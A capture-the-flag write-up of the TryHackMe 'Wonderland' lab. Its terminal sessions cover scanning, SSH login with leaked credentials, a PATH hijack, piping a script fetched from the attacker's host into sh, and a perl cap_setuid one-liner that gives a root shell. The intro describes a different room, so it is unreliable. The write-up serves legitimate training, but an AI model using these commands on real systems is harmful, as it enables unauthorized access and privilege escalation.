---
title: "Walk-through of Wonderland from TryHackMe"
header:
  teaser: /assets/images/2020-06-03-14-47-11.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - injection
  - blind
  - Linux
---

## Machine Information

![injection](/assets/images/2020-06-03-14-47-11.png)

Injection is a beginner level room designed to show the dangers of badly coded web pages. Skills required are basic Linux knowledge and an understanding of the layout of its filesystem. Skills learned are exploiting vulnerable webpages to achieve command injection.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Injection](https://tryhackme.com/room/injection) |
| Machine Release Date | 2nd June 2020 |
| Date I Completed It | 2nd June 2020 |
| Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/releases/kali-linux-2020-1-release/) |

## Tasks 1 and 2

root@kali:~/thm/wonderland# ports=$(nmap -p- --min-rate=1000 -T4 10.10.159.58 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/thm/wonderland# nmap -p$ports -v -sC -sV -oA wonderland 10.10.159.58
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 21:43 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:43
Completed NSE at 21:43, 0.00s elapsed
Initiating NSE at 21:43
Completed NSE at 21:43, 0.00s elapsed
Initiating NSE at 21:43
Completed NSE at 21:43, 0.00s elapsed
Initiating Ping Scan at 21:43
Scanning 10.10.159.58 [4 ports]
Completed Ping Scan at 21:43, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:43
Completed Parallel DNS resolution of 1 host. at 21:43, 0.02s elapsed
Initiating SYN Stealth Scan at 21:43
Scanning 10.10.159.58 [2 ports]
Discovered open port 80/tcp on 10.10.159.58
Discovered open port 22/tcp on 10.10.159.58
Completed SYN Stealth Scan at 21:43, 0.06s elapsed (2 total ports)
Initiating Service scan at 21:43
Scanning 2 services on 10.10.159.58
Completed Service scan at 21:44, 11.36s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.159.58.
Initiating NSE at 21:44
Completed NSE at 21:44, 1.48s elapsed
Initiating NSE at 21:44
Completed NSE at 21:44, 0.11s elapsed
Initiating NSE at 21:44
Completed NSE at 21:44, 0.00s elapsed
Nmap scan report for 10.10.159.58
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)                                                                                                                                                                          
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                                                                                                                             
| http-methods:                                                                                                                                                                                                                            
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                                               
|_http-title: Follow the white rabbit.                                                                                                                                                                                                     
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                                                    
                                                                                                                                                                                                                                           
NSE: Script Post-scanning.                                                                                                                                                                                                                 
Initiating NSE at 21:44                                                                                                                                                                                                                    
Completed NSE at 21:44, 0.00s elapsed                                                                                                                                                                                                      
Initiating NSE at 21:44                                                                                                                                                                                                                    
Completed NSE at 21:44, 0.00s elapsed                                                                                                                                                                                                      
Initiating NSE at 21:44                                                                                                                                                                                                                    
Completed NSE at 21:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)


root@kali:~/thm/wonderland# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.159.58
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.159.58
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/06/05 21:46:13 Starting gobuster
===============================================================
http://10.10.159.58/img (Status: 301)
http://10.10.159.58/r (Status: 301)
http://10.10.159.58/poem (Status: 301)
http://10.10.159.58/http%3A%2F%2Fwww (Status: 301)
http://10.10.159.58/http%3A%2F%2Fyoutube (Status: 301)
http://10.10.159.58/http%3A%2F%2Fblogs (Status: 301)
http://10.10.159.58/http%3A%2F%2Fblog (Status: 301)
http://10.10.159.58/**http%3A%2F%2Fwww (Status: 301)
http://10.10.159.58/http%3A%2F%2Fcommunity (Status: 301)
http://10.10.159.58/http%3A%2F%2Fradar (Status: 301)
http://10.10.159.58/http%3A%2F%2Fjeremiahgrossman (Status: 301)
http://10.10.159.58/http%3A%2F%2Fweblog (Status: 301)
http://10.10.159.58/http%3A%2F%2Fswik (Status: 301)
===============================================================
2020/06/05 21:49:08 Finished
===============================================================

view-source:http://10.10.159.58/r/a/b/b/i/t/
alice:HowDothTheLittleCrocodileImproveHisShiningTail


root@kali:~/thm/wonderland# ssh alice@10.10.217.24
The authenticity of host '10.10.217.24 (10.10.217.24)' can't be established.
ECDSA key fingerprint is SHA256:HUoT05UWCcf3WRhR5kF7yKX1yqUvNhjqtxuUMyOeqR8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.217.24' (ECDSA) to the list of known hosts.
alice@10.10.217.24's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


0 packages can be updated.
0 updates are security updates.
                                                                                                                                                                                                                                           
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                                                      
                                                                                                                                                                                         kkk                                                  
                                                                                                                                                                                                                                           
Last login: Mon May 25 16:37:21 2020 from 192.168.170.1                                                                                                                                                                                    
alice@wonderland:~$ ls /root                                                                                                                                                                                                               
ls: cannot open directory '/root': Permission denied                                                                                                                                                                                       
alice@wonderland:~$ ls /root/user.txt                                                                                                                                                                                                      
/root/user.txt                                                                                                                                                                                                                             
alice@wonderland:~$ ls -lsa /root/user.txt                                                                                                                                                                                                 
4 -rw-r--r-- 1 root root 32 May 25 16:40 /root/user.txt                                                                                                                                                                                    
alice@wonderland:~$ cat /root/user.txt                                                                                                                                                                                              
thm{"Curiouser and curiouser!"}                                                                                                                                                                                                            
alice@wonderland:~$ 

root@kali:~/thm/wonderland# strings teaParty | awk 'length($0) > 10'
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
GCC: (Debian 8.3.0-6) 8.3.0
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
__FRAME_END__
__init_array_end
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
getchar@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable                                                                                                                                                                                                                  
setuid@@GLIBC_2.2.5                                                                                                                                                                                                                        
__cxa_finalize@@GLIBC_2.2.5                                                                                                                                                                                                                
.note.ABI-tag                                                                                                                                                                                                                              
.note.gnu.build-id                                                                                                                                                                                                                         
.gnu.version                                                                                                                                                                                                                               
.gnu.version_r                                                                                                                                                                                                                             
.eh_frame_hdr                                                                                                                                                                                                                              
.init_array                                                                                                                                                                                                                                
.fini_array                                              

root@kali:~/thm/wonderland# r2 teaParty                                                                            
[0x00001090]> ie
[Entrypoints]                                                                                                      
vaddr=0x00001090 paddr=0x00001090 haddr=0x00000018 hvaddr=0x00000018 type=program                                  
                                                                                                                   
1 entrypoints                                                                                                      
                                                                                                                   
[0x00001090]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)                                                           
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)                                                         
[x] Check for objc references                                                                                      
[x] Check for vtables                                                                                              
[x] Type matching analysis for all functions (aaft)                                                                
[x] Propagate noreturn information                                                                                 
[x] Use -AA or aaaa to perform additional experimental analysis.                                                   
[0x00001090]> fs
    0 * classes                                                                                                    
    0 * functions                                                                                                  
   10 * imports                                                                                                    
   10 * relocs                                                                                                     
   30 * sections                                                                                                   
   12 * segments                                                                                                   
    4 * strings                                                                                                    
   31 * symbols                                                                                                    
   26 * symbols.sections                                                                                           
[0x00001090]> fs imports; f
0x00000000 16 loc.imp._ITM_deregisterTMCloneTable                                                                  
0x00000000 16 sym.imp.__libc_start_main                                                                            
0x00000000 16 loc.imp.__gmon_start                                                                                 
0x00000000 16 loc.imp._ITM_registerTMCloneTable                                                                    
0x00000000 16 sym.imp.__cxa_finalize                                                                               
0x00001030 6 sym.imp.puts                                                                                          
0x00001040 6 sym.imp.system
0x00001050 6 sym.imp.getchar
0x00001060 6 sym.imp.setgid
0x00001070 6 sym.imp.setuid
[0x00001090]> fs strings; f
0x00002008 60 str.Welcome_to_the_tea_party___The_Mad_Hatter_will_be_here_soon.
0x00002048 58 str.bin_echo__n__Probably_by______date___date__next_hour___R
0x00002088 69 str.Ask_very_nicely__and_I_will_give_you_some_tea_while_you_wait_for_him
0x000020d0 33 str.Segmentation_fault__core_dumped
[0x00001090]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002008 0x00002008 59  60   .rodata ascii Welcome to the tea party!\nThe Mad Hatter will be here soon.
1   0x00002048 0x00002048 57  58   .rodata ascii /bin/echo -n 'Probably by ' && date --date='next hour' -R
2   0x00002088 0x00002088 68  69   .rodata ascii Ask very nicely, and I will give you some tea while you wait for him
3   0x000020d0 0x000020d0 32  33   .rodata ascii Segmentation fault (core dumped)

rabbit@wonderland:/home/rabbit$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
hatter@wonderland:/home/rabbit$ cd /home/hatter
hatter@wonderland:/home/hatter$ ls
password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?


root@kali:~/thm/wonderland# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2020-06-06 17:49:48--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.56.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.56.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                                 100%[=======================================================================================================================================>]  45.54K  --.-KB/s    in 0.03s   

2020-06-06 17:49:48 (1.43 MB/s) - ‘LinEnum.sh’ saved [46631/46631]

root@kali:~/thm/wonderland# ls
alice_door.jpg  Cutter-v1.10.3-x64.Linux.AppImage  hint1.txt  hint.txt  index.jpeg  LinEnum.sh  linpeas.sh  teaParty  white_rabbit_1.jpg  wonderland.gnmap  wonderland.nmap  wonderland.xml
root@kali:~/thm/wonderland# python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...

https://github.com/rebootuser/LinEnum

root@kali:~/thm/wonderland# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2020-06-06 17:49:48--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.56.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.56.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                                 100%[=======================================================================================================================================>]  45.54K  --.-KB/s    in 0.03s   

2020-06-06 17:49:48 (1.43 MB/s) - ‘LinEnum.sh’ saved [46631/46631]

root@kali:~/thm/wonderland# ls
alice_door.jpg  Cutter-v1.10.3-x64.Linux.AppImage  hint1.txt  hint.txt  index.jpeg  LinEnum.sh  linpeas.sh  teaParty  white_rabbit_1.jpg  wonderland.gnmap  wonderland.nmap  wonderland.xml
root@kali:~/thm/wonderland# python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.59.155 - - [06/Jun/2020 17:55:21] "GET /LinEnum.sh HTTP/1.1" 200 -
10.10.59.155 - - [06/Jun/2020 17:58:22] "GET /LinEnum.sh HTTP/1.1" 200 -




hatter@wonderland:~$ curl http://10.9.17.195:8000/LinEnum.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 46631  100 46631    0     0   263k      0 --:--:-- --:--:-- --:--:--  263k
-e 
#########################################################
-e # Local Linux Enumeration & Privilege Escalation Script #
-e #########################################################
-e # www.rebootuser.com
-e # version 0.982

[-] Debug Info
-e [+] Thorough tests = Disabled
-e 

-e Scan started at:
Sat Jun  6 16:58:23 UTC 2020                                                                                                                                                                                                               
-e                                                                                                                                                                                                                                         

-e ### SYSTEM ##############################################
-e [-] Kernel information:
Linux wonderland 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
-e 

-e [-] Kernel information (continued):
Linux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020
-e 

-e [-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.4 LTS"
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.4 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
-e 

-e [-] Hostname:
wonderland
-e 

-e ### USER/GROUP ##########################################
-e [-] Current user/group info:
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
-e 

-e [-] Users that have previously logged onto the system:
Username         Port     From             Latest
tryhackme        pts/0    10.8.6.110       Fri Jun  5 22:28:57 +0000 2020
alice            pts/1    192.168.170.1    Mon May 25 16:37:21 +0000 2020
hatter           pts/0    10.9.17.195      Sat Jun  6 16:55:03 +0000 2020
-e 

-e [-] Who else is logged on:
 16:58:23 up 5 min,  1 user,  load average: 1.46, 1.72, 0.84
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
hatter   pts/0    10.9.17.195      16:55    7.00s  0.74s  0.08s w
-e 

-e [-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon) groups=1(daemon)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
uid=1001(alice) gid=1001(alice) groups=1001(alice)
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
-e 

<<SNIP>>

e [+] Files with POSIX capabilities set:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
-e 

https://gtfobins.github.io/gtfobins/perl/
Capabilities
It can manipulate its process UID and can be used on Linux as a backdoor to maintain elevated privileges with the CAP_SETUID capability set. This also works when executed by another binary with the capability set.

cp $(which perl) .
sudo setcap cap_setuid+ep perl

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'


hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
# 



https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux
https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc
https://book.hacktricks.xyz/linux-unix/privilege-escalation
